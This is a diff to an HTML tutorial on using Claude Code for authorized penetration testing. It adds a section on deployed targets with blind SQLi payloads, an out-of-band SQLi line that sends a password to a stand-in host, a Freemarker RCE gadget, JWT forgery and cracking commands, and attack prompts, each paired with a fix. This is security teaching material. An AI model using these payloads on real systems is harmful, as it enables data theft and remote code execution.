@@ -134,6 +134,9 @@ body{font-size:16px}.wrap{padding:16px 14px 50px}.stats{grid-template-columns:1f
 .pbtn{min-width:72px;font-size:11.5px}.flow .arw{display:none}.flow .node{flex-basis:44%}
 }
 </style><link rel="stylesheet" type="text/css" href="../../assets/css/reading-theme.css">
+<meta name="description" content="A field guide and seven-phase playbook for using Claude Code as a security copilot on authorized engagements — driving scanners, reviewing source, writing proof-of-concept exploits, and drafting the report, all under a permission model you control.">
+<meta property="og:description" content="A field guide and seven-phase playbook for using Claude Code as a security copilot on authorized engagements — driving scanners, reviewing source, writing proof-of-concept exploits, and drafting the report, all under a permission model you control.">
+<meta name="twitter:description" content="A field guide and seven-phase playbook for using Claude Code as a security copilot on authorized engagements — driving scanners, reviewing source, writing proof-of-concept exploits, and drafting the report, all under a permission model you control.">
 <meta property="og:title" content="Penetration Testing with Claude Code">
 <meta property="og:type" content="article">
 <meta property="og:site_name" content="cache">
@@ -207,6 +210,19 @@ seven-phase playbook for using it on engagements <b>you are authorized to run</b
 <div class=byline>A study, July 17, 2026 &middot; for authorized testing, CTFs, and research only &middot; <a href="#play">jump to the playbook &darr;</a></div>
 </header>
 
+<nav class="outline" aria-label="Outline">
+  <a href="#intro">0 · What it is</a>
+  <a href="#fit">1 · Where it fits</a>
+  <a href="#play">2 · The playbook</a>
+  <a href="#manual">3 · Field manual</a>
+  <a href="#vulnshop">4 · VulnShop lab</a>
+  <a href="#deployed">5 · Deployed targets</a>
+  <a href="#setup">6 · Setup</a>
+  <a href="#guardrails">7 · Guardrails</a>
+  <a href="#limits">8 · What it can't do</a>
+  <a href="#checklist">Checklist</a>
+</nav>
+
 <div class=warn><span class=h>Read this first</span>
 Everything below assumes <b>written authorization</b> for the systems in scope &mdash; a signed
 engagement, a lab you own, or a sanctioned CTF. Running these techniques against systems you
@@ -221,7 +237,7 @@ malicious use</em>; treat that guardrail as a floor, not a substitute for your o
 <div class=stat><b>1</b><small>built-in <code>/security-review</code></small></div>
 </div>
 
-<section><h2><span class=n>0</span>What Claude Code actually is, to a pentester</h2>
+<section id=intro><h2><span class=n>0</span>What Claude Code actually is, to a pentester</h2>
 <p>Strip away the "coding assistant" framing and Claude Code is a <b>terminal agent</b>: a model
 that can read files, run shell commands, search the web, edit code, and loop on the output of
 its own actions. That loop &mdash; observe, decide, run a tool, read the result, decide again &mdash; is
@@ -245,7 +261,7 @@ allow-list or an explicit approval. That layer is the whole reason this is usabl
 engagement rather than a liability.</p>
 </section>
 
-<section><h2><span class=n>1</span>Where it's strong, and where it isn't</h2>
+<section id=fit><h2><span class=n>1</span>Where it's strong, and where it isn't</h2>
 <p>Suitability varies a lot by phase. The honest picture &mdash; strongest at reading code and writing
 reports, deliberately weakest at anything resembling autonomous, destructive, or out-of-scope
 action:</p>
@@ -430,7 +446,7 @@ what it did rather than from what you re-explain.</p>
 
 <div class=divider><span>Breaking websites</span></div>
 
-<section><h2><span class=n>3</span>The web attacker's field manual</h2>
+<section id=manual><h2><span class=n>3</span>The web attacker's field manual</h2>
 <p>This is the applied core: the vulnerability classes that actually get web apps popped, each with
 how you get Claude Code to <b>find</b> it, how you <b>exploit</b> it, the <b>payloads</b> that prove it,
 and the <b>fix</b>. The workflow underneath all of them is the same &mdash; proxy the app's traffic
@@ -652,7 +668,7 @@ isn't inventing exploits, it's covering the entire surface fast and never skippi
 check that turns out to matter.</p>
 </section>
 
-<section><h2><span class=n>4</span>The practice target: VulnShop</h2>
+<section id=vulnshop><h2><span class=n>4</span>The practice target: VulnShop</h2>
 <p>Reading about payloads only gets you so far &mdash; you need something to break. This report ships a
 runnable one. <b>VulnShop</b> is a ~150-line Flask app in <code>lab/vulnshop.py</code> that wires up
 every class in the field manual as a real, exploitable endpoint. It binds to <code>127.0.0.1</code>,
@@ -720,7 +736,150 @@ test is a computer-crime offense &mdash; the technique is identical, only the au
 the authorization is the whole thing.</div>
 </section>
 
-<section><h2><span class=n>5</span>Setup: making it safe and repeatable</h2>
+<div class=divider><span>Deployed targets</span></div>
+
+<section id=deployed><h2><span class=n>5</span>Advanced: hitting a deployed target</h2>
+<p>VulnShop was localhost with the source in your hand. The next rung is a <b>real, hosted</b> app you're
+authorized to test &mdash; a <a href="https://portswigger.net/web-security">PortSwigger Web Security Academy</a>
+lab, a hosted <a href="https://owasp.org/www-project-juice-shop/">Juice Shop</a>, a Hack The Box /
+TryHackMe box, or an in-scope <b>bug-bounty</b> asset. The vulnerability classes are the same five
+(1&nbsp;SQLi, 2&nbsp;XSS, 3&nbsp;access control, 4&nbsp;auth/JWT, 6&nbsp;SSTI/RCE), but they show up in
+their <em>blind, filtered, and hardened</em> forms. What changes is discipline more than technique.</p>
+<div class=note><b>These are authorized targets.</b> Academy labs are explicitly yours to break; a bounty
+program's scope <em>is</em> your written authorization. That's the whole reason this section can exist &mdash;
+it never points an exploit at a non-consenting site. Read the program rules and stay inside them.</div>
+
+<h3>What changes off localhost</h3>
+<table class=cap>
+<tr><th>Dimension</th><th>VulnShop (localhost)</th><th>Deployed lab / in-scope target</th></tr>
+<tr><td><b>Source</b></td><td>full white-box, read the code</td><td>black-box &mdash; infer behavior from responses</td></tr>
+<tr><td><b>Feedback</b></td><td>instant, verbose errors</td><td>silent, blind, rate-limited, maybe a WAF</td></tr>
+<tr><td><b>Exfil</b></td><td>data right in the response</td><td>often out-of-band (OAST callback)</td></tr>
+<tr><td><b>Verify</b></td><td>re-read the code</td><td>behavioral only &mdash; higher false-positive risk</td></tr>
+<tr><td><b>Blast radius</b></td><td>none</td><td>real infra: throttle, never DoS, capture evidence</td></tr>
+</table>
+<p>The two pieces of kit that make this work: put a <b>proxy in the middle</b> (Burp Suite via its MCP
+server, or <code>mitmproxy</code>) so Claude reads, mutates, and replays the real browser traffic; and
+stand up an <b>OAST endpoint</b> (Burp Collaborator or <code>interactsh</code>) so blind bugs have somewhere
+to phone home. Then work the five classes in their advanced forms.</p>
+
+<details class=card><summary><b>1 &middot; Blind &amp; out-of-band SQLi</b><span class=tag>no output? no problem</span></summary>
+<div class=body>
+<p class=mut>Hosted apps rarely echo SQL errors, so the UNION trick from VulnShop won't show anything. You
+extract data one inference at a time, or force the database itself to call home.</p>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>payloads<button class=copy>Copy</button></div><pre><span class=cmt># boolean-blind: true vs false changes the page, 1 bit per request</span>
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'-- -
+<span class=cmt># time-blind: a 5s delay means "true"</span>
+' AND IF(1=1,SLEEP(5),0)-- -
+<span class=cmt># out-of-band (OAST): DB makes a DNS/HTTP callback carrying the data</span>
+'; exec master..xp_dirtree '//'+(SELECT TOP 1 pw FROM users)+'.oast.example/'--</pre></div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>The id param at /product?id= is blind SQLi (page differs on ' AND 1=1 vs 1=2).
+Write an extraction oracle that binary-searches each character of the current
+DB user, one request at a time, with a 300ms delay between requests. If that's
+too slow, switch to an OOB payload against my Collaborator domain instead.</pre></div>
+<p class=mut>Or hand it to <code>sqlmap -u "...?id=1" --technique=BT --dbms=... --level 4</code> and let Claude
+interpret the dump. <b>Fix:</b> parameterized queries, as always.</p>
+</div></details>
+
+<details class=card><summary><b>2 &middot; DOM XSS, blind XSS &amp; CSP bypass</b><span class=tag>client-side</span></summary>
+<div class=body>
+<p class=mut>Framework-built apps auto-escape server-side, so the bug moves into the JavaScript and behind
+a Content-Security-Policy.</p>
+<ul>
+<li><b>DOM XSS:</b> a source (<code>location.hash</code>, <code>postMessage</code>, <code>document.referrer</code>)
+flows to a sink (<code>innerHTML</code>, <code>eval</code>, <code>setAttribute</code>) entirely in the
+browser. Claude fetches and beautifies the minified bundle and traces source&nbsp;&rarr;&nbsp;sink.</li>
+<li><b>Blind XSS:</b> your payload fires later in an admin view you never see &mdash; deliver a beacon to an
+OOB collector and wait for the callback.</li>
+<li><b>CSP bypass:</b> find an allowlisted-but-abusable origin (a JSONP endpoint, <code>unsafe-eval</code>,
+a missing <code>base-uri</code>). Claude reads the CSP header and tells you which payload survives it.</li>
+</ul>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Fetch this app's JS bundles, beautify them, and map every DOM source
+(location.*, postMessage, referrer) to every sink (innerHTML, eval,
+document.write). Flag the attacker-controllable paths. Then read the CSP
+response header and tell me whether any XSS payload survives it, and how.</pre></div>
+<p class=mut><b>Fix:</b> safe DOM APIs (<code>textContent</code>), a strict CSP with no <code>unsafe-*</code>,
+trusted-types.</p>
+</div></details>
+
+<details class=card><summary><b>3 &middot; Layered access control &amp; IDOR</b><span class=tag>authz logic</span></summary>
+<div class=body>
+<p class=mut>The obvious incrementing-ID IDOR is usually patched on a mature app. The surviving bugs are
+subtler, and this is exactly where Claude's ability to model a whole flow across many requests pays off.</p>
+<ul>
+<li><b>Unpredictable IDs that leak elsewhere:</b> a GUID you can't guess &mdash; but it appears in another
+response, an email, or a <code>Referer</code>.</li>
+<li><b>Multi-step / state-machine flaws:</b> authorization checked on step 1 of a wizard but not step 3.</li>
+<li><b>Header/location-based:</b> access gated by a <code>Referer</code> or <code>X-Forwarded-For</code>
+you fully control.</li>
+</ul>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Crawl the app as low-priv user A and map every multi-step flow (checkout,
+account, admin wizards). For each object reference, tell me where the ID comes
+from and whether authorization is re-checked at EVERY step, not just the first.
+Then propose the exact request sequence that reaches user B's data.</pre></div>
+<p class=mut><b>Fix:</b> re-authorize every object on every request and every step; deny by default.</p>
+</div></details>
+
+<details class=card><summary><b>4 &middot; JWT algorithm confusion &amp; header injection</b><span class=tag>token forgery</span></summary>
+<div class=body>
+<p class=mut>VulnShop fell to <code>alg:none</code>; a hardened app needs sharper tricks.</p>
+<ul>
+<li><b>RS256 &rarr; HS256 confusion:</b> if the server accepts either, sign a forged token with its
+<em>public</em> key used as the HMAC secret &mdash; a signature it'll happily verify.</li>
+<li><b><code>jwk</code>/<code>jku</code>/<code>kid</code> injection:</b> smuggle your own key in the header, point
+<code>jku</code> at a JWKS you host, or abuse <code>kid</code> with path traversal / SQLi to a key you control.</li>
+<li><b>Weak secret:</b> crack HS256 offline &mdash; <code>hashcat -m 16500 jwt.txt rockyou.txt</code>.</li>
+</ul>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>tooling<button class=copy>Copy</button></div><pre><span class=cmd>jwt_tool eyJ... -X k   </span><span class=cmt># key-confusion attack (needs the public key)</span>
+<span class=cmd>jwt_tool eyJ... -X i -pk pubkey.pem</span>  <span class=cmt># jwk header injection</span></pre></div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Decode this JWT and its headers. Tell me which forgery class the server is
+likely vulnerable to (alg:none, RS256->HS256 confusion, jwk/jku/kid injection,
+or a crackable secret), then drive jwt_tool to produce a token with role=admin
+and confirm it against /admin.</pre></div>
+<p class=mut><b>Fix:</b> pin the algorithm, verify against a fixed key, ignore attacker-supplied
+<code>jwk</code>/<code>jku</code>/<code>kid</code>, use a long random secret.</p>
+</div></details>
+
+<details class=card><summary><b>6 &middot; SSTI: fingerprint &rarr; sandbox escape (incl. blind)</b><span class=tag>RCE</span></summary>
+<div class=body>
+<p class=mut>Deployed apps hide which template engine they use and often sandbox it, so you fingerprint first,
+then reach for the escape documented for <em>that</em> engine.</p>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>fingerprint tree<button class=copy>Copy</button></div><pre><span class=cmt># narrow the engine by which probe evaluates</span>
+{{7*7}}   -> 49  : Jinja2 / Twig      ${7*7} -> 49 : Freemarker / Velocity
+{{7*'7'}} -> 7777777 : Jinja2         #{7*7} -> 49 : Ruby ERB-ish
+<span class=cmt># then the engine-specific RCE gadget, e.g. Freemarker:</span>
+${"freemarker.template.utility.Execute"?new()("id")}</pre></div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>The name field renders server-side. Run the SSTI fingerprint probes and tell me
+the engine from the responses. Then give me the documented sandbox-escape gadget
+for that engine to run `id`. If nothing reflects, it may be blind -- switch to a
+gadget that makes an HTTP callback to my Collaborator domain to confirm RCE.</pre></div>
+<p class=mut><b>Fix:</b> never render user input as a template; use a logic-less engine; sandbox and patch it.</p>
+</div></details>
+
+<h3>The verification loop matters more here</h3>
+<p>Off localhost you can't re-read the source to confirm a hit, and blind results lie: a WAF delay or a
+flaky endpoint can look exactly like time-based SQLi. So make Claude <b>try to disprove its own
+findings</b> before you believe them &mdash; the find-then-refute pattern from the advanced menu:</p>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>For each candidate finding, act as a skeptic: re-run it 5x, control for network
+latency (compare against a benign request of similar size), and for anything
+"blind" require that the OOB callback actually landed in the interaction log.
+Report only the findings that survive, with the evidence that convinced you.</pre></div>
+<p class=mut>Running the refutation as a separate subagent (or a parallel pass) is even better &mdash; a fresh context
+isn't invested in the original claim, so it's a harsher critic.</p>
+
+<div class=warn><span class=h>Deployed-target discipline</span>
+Throttle your requests and never test availability (no DoS, no load testing) unless the scope explicitly
+allows it. Stay on the documented in-scope hosts. Capture request/response pairs as evidence rather than
+hoarding data. Honor the program's safe-harbor terms &mdash; on Academy labs this is free practice; on a
+bounty target it's the difference between a payout and a prosecution.</div>
+<p class=mut>Good places to practice, all authorized: the PortSwigger Web Security Academy (free, mapped to exactly
+these classes), OWASP Juice Shop, Hack The Box, TryHackMe, and &mdash; once you're fluent &mdash; a bug-bounty
+program on HackerOne, Bugcrowd, or Intigriti, tested strictly within its scope.</p>
+</section>
+
+<div class=divider><span>Running engagements</span></div>
+
+<section id=setup><h2><span class=n>6</span>Setup: making it safe and repeatable</h2>
 <p>Four pieces of configuration turn the generic CLI into a purpose-built, guard-railed pentest rig.</p>
 
 <h3>Permission modes &mdash; your primary safety control</h3>
@@ -769,7 +928,7 @@ pentest finding is the one caught before it ever ships &mdash; run the offensive
 staging and this against the codebase, and the two halves close the loop.</p>
 </section>
 
-<section><h2><span class=n>6</span>Guardrails: what it will and won't do</h2>
+<section id=guardrails><h2><span class=n>7</span>Guardrails: what it will and won't do</h2>
 <p>Claude Code is deliberately dual-use-aware. It <b>assists</b> authorized penetration testing,
 CTF challenges, security research, and defensive work. It <b>refuses</b> the things that
 characterize malicious intent regardless of how they're framed:</p>
@@ -788,7 +947,7 @@ what lets the tool exist in this space at all &mdash; but it is not your complia
 authorization, and the law are still yours to get right.</p>
 </section>
 
-<section><h2><span class=n>7</span>What it can't do</h2>
+<section id=limits><h2><span class=n>8</span>What it can't do</h2>
 <ul>
 <li><b>It is not an autonomous attacker.</b> It's strongest as a copilot on a human-driven
 engagement. Long multi-stage kill chains drift, lose thread, and need steering. The win is
@@ -805,7 +964,7 @@ authorize anything. Written permission and legal scope come from you, every time
 </ul>
 </section>
 
-<section><h2>The one-screen checklist</h2>
+<section id=checklist><h2>The one-screen checklist</h2>
 <p class=mut>Before you start an engagement. Tap to tick off &mdash; kept in your browser only.</p>
 <ul class=check>
 <li><input type=checkbox><span><span class=k>Authorization in hand.</span> Signed scope / engagement letter / CTF rules covering every target.</span></li>
@@ -854,6 +1013,16 @@ judgment. Tool behavior and guardrails reflect Claude Code as of mid-2026 and ev
     li.addEventListener('click',function(e){if(e.target!==cb){cb.checked=!cb.checked;}sync();});
     cb.addEventListener('change',sync);
   });
+  // outline scroll-spy (matches the other reading articles)
+  var oLinks=[].slice.call(document.querySelectorAll('nav.outline a'));
+  var oTargets=oLinks.map(function(a){return document.querySelector(a.getAttribute('href'));});
+  function syncOutline(){
+    var active=0;
+    oTargets.forEach(function(t,i){if(t&&t.getBoundingClientRect().top<=130)active=i;});
+    oLinks.forEach(function(a,i){a.classList.toggle('active',i===active);});
+  }
+  document.addEventListener('scroll',syncOutline,{passive:true});
+  syncOutline();
 })();
 </script>
 </body></html>
